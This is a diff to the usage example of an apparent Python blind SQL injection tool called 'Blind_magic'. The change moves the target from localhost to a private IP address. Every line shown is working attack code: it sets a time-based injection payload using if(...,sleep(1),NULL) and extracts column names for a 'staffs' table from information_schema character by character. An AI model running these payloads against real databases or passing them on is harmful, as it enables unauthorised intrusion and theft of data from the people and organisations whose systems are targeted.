@@ -11,12 +11,11 @@ Blind query statament:
 {CHAR}  
   
 example:  
-  
-blind_magic = Blind_magic()  
-blind_magic.l(13,5,0,0,0,1,0,0,0,0)  
-blind_magic.url = "http://localhost/?id="  
-blind_magic.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"  
-blind_magic.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"  
-blind_magic.query = "select table_name from information_schema.tables limit {l2},1"  
-blind_magic.run()  
-print blind_magic.result  
+b = Blind_magic()
+b.l(1,0,0,0,0,10,3,0,0,0)  
+b.url = "http://10.0.42.224/?q="  
+b.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"  
+b.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"  
+b.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"
+b.run()
+print b.result  
